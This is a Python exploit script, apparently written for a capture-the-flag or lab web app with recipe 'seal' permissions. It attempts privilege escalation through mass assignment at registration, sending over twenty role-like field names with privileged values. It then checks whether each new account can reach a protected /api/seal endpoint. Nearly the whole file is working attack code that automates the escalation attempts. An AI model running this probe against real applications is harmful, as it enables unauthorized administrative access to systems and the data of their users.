#!/usr/bin/env python3
"""Mass-assign the ROLE at registration, with /api/seal as the oracle.

The seal endpoint gates on the caller's DB role before doing anything else, so every
body-level trick is unreachable and the only real prize is a user document whose role is
chief or inspector. The register handler answers `{ok, user, role}`, which makes the
stored field directly observable, and a handler written as `new User(req.body)` would
accept a role from the client. Previous notes say "session-role smuggling" was disproved
but never show which field names were tried; re-run it against the full synonym set and
check the prize (a non-403 /api/seal), not just the echo.
"""
import sys
import time

from cc import Client

FIELDS = ["role", "roles", "user_role", "userType", "type", "kind", "level", "tier",
          "rank", "group", "groups", "isAdmin", "is_admin", "admin", "staff", "authority",
          "permission", "permissions", "privileges", "clearance", "title", "badge"]
VALUES = ["chief", "inspector", ["chief", "inspector"], True, "admin"]

def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()

made = []
seq = int(time.time()) % 100000
for f in FIELDS:
    for v in VALUES[:2] if f not in ("isAdmin", "is_admin", "admin", "staff") else [True, "chief"]:
        u = "r%02dx%d" % (len(made), seq)
        body = {"username": u, "password": "Passw0rd!"}
        body[f] = v
        c = Client()
        code, out, dt = c.post("/register", body)
        if not isinstance(out, dict):
            w("  %-12s=%-22s -> %s %s" % (f, str(v)[:20], code, str(out)[:70]))
            break
        echoed = out.get("role")
        if code == 200 and echoed != "baker":
            w("  !!! %-12s=%-22s -> register echoed role=%r" % (f, str(v)[:20], echoed))
        # the real prize: can this account seal?
        code, out, dt = c.post("/api/recipe", {"title": "role probe",
                                               "ingredients": [{"name": "flour", "value": "1"}]})
        rid = out.get("id") if isinstance(out, dict) else None
        if rid:
            scode, sout, sdt = c.post("/api/seal", {"recipeId": rid})
            if scode != 403:
                w("  !!! %-12s=%-22s -> /api/seal %s %s" % (f, str(v)[:20], scode, str(sout)[:120]))
            else:
                w("   %-12s=%-22s role=%s seal=403" % (f, str(v)[:20], echoed))
        made.append(u)
        if len(made) >= 14:
            w("(stopped after 14 accounts to respect the register rate limit)")
            sys.exit(0)
        time.sleep(4.5)
